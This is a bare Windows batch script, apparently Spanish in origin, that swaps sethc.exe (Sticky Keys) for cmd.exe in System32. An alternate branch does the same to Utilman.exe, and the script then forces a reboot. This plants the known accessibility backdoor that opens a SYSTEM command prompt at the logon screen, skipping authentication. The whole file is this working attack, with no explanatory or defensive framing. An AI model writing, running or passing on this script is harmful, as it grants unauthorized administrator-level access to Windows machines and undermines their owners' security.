@ECHO OFF

C:

CD "C:\Windows\System32"

GOTO SETHC
REM GOTO UTILMAN

:SETHC

COPY "C:\Windows\System32\sethc.exe" "C:\Windows\System32\sethc_copia.exe"

REN "C:\Windows\System32\sethc.exe" "sethc1.exe"

COPY "C:\Windows\System32\cmd.exe" "C:\Windows\System32\cmd_copia.exe"

REN "C:\Windows\System32\cmd.exe" "sethc.exe"

GOTO END

:UTILMAN

COPY "C:\Windows\System32\Utilman.exe" "C:\Windows\System32\Utilman_copia.exe"

REN "C:\Windows\System32\Utilman.exe" "Utilman1.exe"

COPY "C:\Windows\System32\cmd.exe" "C:\Windows\System32\cmd_copia.exe"

REN "C:\Windows\System32\cmd.exe" "Utilman.exe"

:END

PAUSE

SHUTDOWN /R /T 0
